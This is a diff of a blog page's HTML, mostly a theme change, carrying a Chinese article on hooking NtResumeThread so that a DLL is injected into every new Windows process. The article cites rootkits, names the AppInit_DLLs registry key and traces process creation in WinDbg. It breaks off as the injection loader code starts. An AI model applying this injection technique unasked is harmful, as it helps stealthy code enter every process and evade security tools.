@@ -1,11 +1,23 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="henices">
+  <meta name="keywords" content="">
+  
     <meta name="description" content="挂钩一直是Hack 编程中永恒的主题，基本高级的Rootkit 程序多多少少都会使用Hook 技术。似乎Hook 都被讲烂了，不论是Ring3 的还是Ring0 的网上都有例子。Ring0 的毋庸置疑当然是全局的了，这里说说ring3 的全局hook。Ring 3 有Ring 3 的优势，稳定是压倒一切的，因此Mcafee 和其他一些商业的安全软件都还是使用了Ring3 的Hook 技术，无论如何">
 <meta property="og:type" content="article">
 <meta property="og:title" content="挂钩 NtResumeThread 实现全局Hook">
@@ -17,178 +29,298 @@
 <meta property="article:modified_time" content="2008-05-24T16:00:00.000Z">
 <meta property="article:author" content="henices">
 <meta property="article:tag" content="windows">
-<meta name="twitter:card" content="summary">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>挂钩 NtResumeThread 实现全局Hook</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>挂钩 NtResumeThread 实现全局Hook - 安全代码</title>
 
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <link href="https://cdn.jsdelivr.net/npm/firacode@6.2.0/distr/fira_code.css" rel="stylesheet">
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="安全代码" type="application/atom+xml" />
-    
-	<!-- mathjax -->
-	
-		<script type="text/x-mathjax-config">
-		  MathJax.Hub.Config({
-			tex2jax: {
-			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
-			  inlineMath: [['$','$']]
-			}
-		  });
-		</script>
-		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
-	
-<meta name="generator" content="Hexo 7.2.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/search/">搜索</a></li><!--
-     --><!--
-       --><li><a href="/links/">链接</a></li><!--
-     --><!--
-       --><li><a href="/rss.xml">RSS</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="上一篇" href="/cn/sqlserver2005_xpcmdshell/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="下一篇" href="/cn/int23_native_api/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://usmacd.com/cn/hook_ntResume/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://usmacd.com/cn/hook_ntResume/&text=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://usmacd.com/cn/hook_ntResume/&is_video=false&description=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=挂钩 NtResumeThread 实现全局Hook&body=Check out this article: http://usmacd.com/cn/hook_ntResume/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://usmacd.com/cn/hook_ntResume/&name=挂钩 NtResumeThread 实现全局Hook&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://usmacd.com/cn/hook_ntResume/&t=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%A5%E5%BE%80%E7%9A%84Ring-3%E5%85%A8%E5%B1%80Hook"><span class="toc-number">1.</span> <span class="toc-text">1. 以往的Ring 3全局Hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B%E8%BF%87%E7%A8%8B%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">2. 分析系统创建进程过程，寻找方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">3. 具体代码实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">4. 参考资料</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        挂钩 NtResumeThread 实现全局Hook
-    </h1>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
 
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">henices</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2008-05-24T16:00:00.000Z" class="dt-published" itemprop="datePublished">2008-05-25</time>
-        
-        (Updated: <time datetime="2008-05-24T16:00:00.000Z" class="dt-updated" itemprop="dateModified">2008-05-25</time>)
-        
-      
-    </div>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
 
 
-      
 
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/windows/" rel="tag">windows</a>
-    </div>
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
 
 
-    </div>
-  </header>
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <p>挂钩一直是Hack 编程中永恒的主题，基本高级的Rootkit 程序多多少少都会使用Hook 技术。<br>似乎Hook 都被讲烂了，不论是Ring3 的还是Ring0 的网上都有例子。Ring0 的毋庸置疑当然<br>是全局的了，这里说说ring3 的全局hook。Ring 3 有Ring 3 的优势，稳定是压倒一切的，<br>因此Mcafee 和其他一些商业的安全软件都还是使用了Ring3 的Hook 技术，无论如何用户是<br>无法接受蓝屏和死机的。</p>
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"usmacd.com","root":"/","version":"1.9.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="安全代码" type="application/atom+xml">
+<link rel="alternate" href="/rss.xml" title="安全代码" type="application/rss+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>安全代码</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/rss.xml" target="_self">
+                <i class="iconfont icon-rss"></i>
+                <span>rss</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/sitemap.xml" target="_self">
+                
+                <span>sitemap</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://images.unsplash.com/photo-1473181488821-2d23949a045a?w=640') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">挂钩 NtResumeThread 实现全局Hook</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2008-05-25 00:00" pubdate>
+          2008年5月25日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">挂钩 NtResumeThread 实现全局Hook</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>挂钩一直是Hack 编程中永恒的主题，基本高级的Rootkit 程序多多少少都会使用Hook 技术。<br>似乎Hook 都被讲烂了，不论是Ring3 的还是Ring0 的网上都有例子。Ring0 的毋庸置疑当然<br>是全局的了，这里说说ring3 的全局hook。Ring 3 有Ring 3 的优势，稳定是压倒一切的，<br>因此Mcafee 和其他一些商业的安全软件都还是使用了Ring3 的Hook 技术，无论如何用户是<br>无法接受蓝屏和死机的。</p>
 <p>感兴趣的可以装个Rootkit unhooker 自己看看。 :)</p>
 <h2 id="1-以往的Ring-3全局Hook"><a href="#1-以往的Ring-3全局Hook" class="headerlink" title="1. 以往的Ring 3全局Hook"></a>1. 以往的Ring 3全局Hook</h2><p>纵观网上流行的全局Hook 程序都只用了一个Windows API， SetWindowsHookEx，此函数原型：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK <span class="title function_">SetWindowsHookEx</span><span class="params">(      </span></span><br><span class="line"><span class="params">    <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">    HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">    HINSTANCE hMod,</span></span><br><span class="line"><span class="params">    DWORD dwThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(      </span><br><span class="hljs-params">    <span class="hljs-type">int</span> idHook,</span><br><span class="hljs-params">    HOOKPROC lpfn,</span><br><span class="hljs-params">    HINSTANCE hMod,</span><br><span class="hljs-params">    DWORD dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">idhook   安装的钩子类型，如 WH_GETMESSAGE，WH_KEYBOARD 等</span><br><span class="line">lpfn     hook procedure 的指针</span><br><span class="line">hmod     包含 hook procedure DLL 的handle</span><br><span class="line">dwThread 为0</span><br></pre></td></tr></table></figure>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">idhook   安装的钩子类型，如 WH_GETMESSAGE，WH_KEYBOARD 等<br>lpfn     hook <span class="hljs-function"><span class="hljs-keyword">procedure</span> 的指针</span><br><span class="hljs-function"><span class="hljs-title">hmod</span>     包含 <span class="hljs-title">hook</span> <span class="hljs-title">procedure</span> <span class="hljs-title">DLL</span> 的<span class="hljs-title">handle</span></span><br><span class="hljs-function"><span class="hljs-title">dwThread</span> 为0</span><br></code></pre></td></tr></table></figure>
 
 <p>使用这个这个API 时候有问题的，只能挂接系统中的所有G U I线程，换句通俗的话说就是有界面<br>的程序，Windows console 类的程序就无能为力了。</p>
 <p>还有一种通过插入注册表来实现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs<br></code></pre></td></tr></table></figure>
 
 <p>这种方法简单，但是还是只能挂钩GUI 程序，并且这个键值已经被广大HIPS 所关注，吃力不讨好。</p>
 <p>以上两种效果不好，因此有人有开始另外的做法，枚举所有进程，插入和挂钩 NtCreateProcess<br>这是非常自然的想法，似乎也把问题解决了，但是仔细思考一下，就会发现很多问题。</p>
@@ -201,10 +333,10 @@
 <p>下面是他的blog 链接：<br><a target="_blank" rel="noopener" href="http://hi.baidu.com/fatbsd/blog">http://hi.baidu.com/fatbsd/blog</a></p>
 <p>CreateProcess 是 Kernel32.dll 的导出函数。</p>
 <p>操起WinDbg，剁了一下： Windows 2003 SP2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; uf CreateProcessW</span><br><span class="line">kernel32!CreateProcessW:</span><br><span class="line">7c802474 8bff             mov     edi,edi</span><br><span class="line">7c802476 55               push    ebp</span><br><span class="line">7c802477 8bec             mov     ebp,esp</span><br><span class="line">7c802479 6a00             push    0x0</span><br><span class="line">7c80247b ff752c           push    dword ptr [ebp+0x2c]</span><br><span class="line">7c80247e ff7528           push    dword ptr [ebp+0x28]</span><br><span class="line">7c802481 ff7524           push    dword ptr [ebp+0x24]</span><br><span class="line">7c802484 ff7520           push    dword ptr [ebp+0x20]</span><br><span class="line">7c802487 ff751c           push    dword ptr [ebp+0x1c]</span><br><span class="line">7c80248a ff7518           push    dword ptr [ebp+0x18]</span><br><span class="line">7c80248d ff7514           push    dword ptr [ebp+0x14]</span><br><span class="line">7c802490 ff7510           push    dword ptr [ebp+0x10]</span><br><span class="line">7c802493 ff750c           push    dword ptr [ebp+0xc]</span><br><span class="line">7c802496 ff7508           push    dword ptr [ebp+0x8]</span><br><span class="line">7c802499 6a00             push    0x0</span><br><span class="line">7c80249b e8a6ac0200       call    kernel32!CreateProcessInternalW (7c82d146)</span><br><span class="line">7c8024a0 5d               pop     ebp</span><br><span class="line">7c8024a1 c22800           ret     0x28</span><br><span class="line"></span><br><span class="line">lkd&gt; uf CreateProcessInternalW</span><br><span class="line">....</span><br><span class="line">7c82cf8f ff159814807c call dword ptr [kernel32!_imp__NtCreateProcessEx (7c801498)]</span><br><span class="line">....</span><br><span class="line">7c82daa2 ff159414807c call dword ptr [kernel32!_imp__NtCreateThread (7c801494)]</span><br><span class="line">....</span><br><span class="line">7c82dbdc ff158814807c call dword ptr [kernel32!_imp__NtResumeThread (7c801488)]</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm">lkd&gt; uf CreateProcessW<br>kernel32!CreateProcessW:<br>7c802474 8bff             mov     edi,edi<br>7c802476 55               push    ebp<br>7c802477 8bec             mov     ebp,esp<br>7c802479 6a00             push    0x0<br>7c80247b ff752c           push    dword ptr [ebp+0x2c]<br>7c80247e ff7528           push    dword ptr [ebp+0x28]<br>7c802481 ff7524           push    dword ptr [ebp+0x24]<br>7c802484 ff7520           push    dword ptr [ebp+0x20]<br>7c802487 ff751c           push    dword ptr [ebp+0x1c]<br>7c80248a ff7518           push    dword ptr [ebp+0x18]<br>7c80248d ff7514           push    dword ptr [ebp+0x14]<br>7c802490 ff7510           push    dword ptr [ebp+0x10]<br>7c802493 ff750c           push    dword ptr [ebp+0xc]<br>7c802496 ff7508           push    dword ptr [ebp+0x8]<br>7c802499 6a00             push    0x0<br>7c80249b e8a6ac0200       call    kernel32!CreateProcessInternalW (7c82d146)<br>7c8024a0 5d               pop     ebp<br>7c8024a1 c22800           ret     0x28<br><br>lkd&gt; uf CreateProcessInternalW<br>....<br>7c82cf8f ff159814807c call dword ptr [kernel32!_imp__NtCreateProcessEx (7c801498)]<br>....<br>7c82daa2 ff159414807c call dword ptr [kernel32!_imp__NtCreateThread (7c801494)]<br>....<br>7c82dbdc ff158814807c call dword ptr [kernel32!_imp__NtResumeThread (7c801488)]<br></code></pre></td></tr></table></figure>
 
 <p>大概流程如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Kernel32!CreateProcessW</span><br><span class="line">Kernel32!CreateProcessInternalW</span><br><span class="line">ntdll!NtCreateProcessEx</span><br><span class="line">ntdll!NtCreateThread</span><br><span class="line">ntdll!NtResumeThread</span><br></pre></td></tr></table></figure>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Kernel32!CreateProcessW<br>Kernel32!CreateProcessInternalW<br>ntdll!NtCreateProcessEx<br>ntdll!NtCreateThread<br>ntdll!NtResumeThread<br></code></pre></td></tr></table></figure>
 
 <p>因为进程创建后，Windows 必须为它创建一个主线程，然后等待操作系统调度它。所以调用NtResumeThread的时候，就是我们Hook的最佳时机，因为此时创建进程的主要工作已经完成，但是进程并没有调度起来，呵呵，方便干坏事啊。</p>
 <h2 id="3-具体代码实现"><a href="#3-具体代码实现" class="headerlink" title="3. 具体代码实现"></a>3. 具体代码实现</h2><p>基本思路已经清晰了，这里还几个问题。</p>
@@ -217,158 +349,345 @@
 <p>c. 在多线程的环境下是否可靠？</p>
 <p>  使用关键代码段，互斥锁，效果还可以。</p>
 <p>Loader：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">inject</span><span class="params">(HANDLE 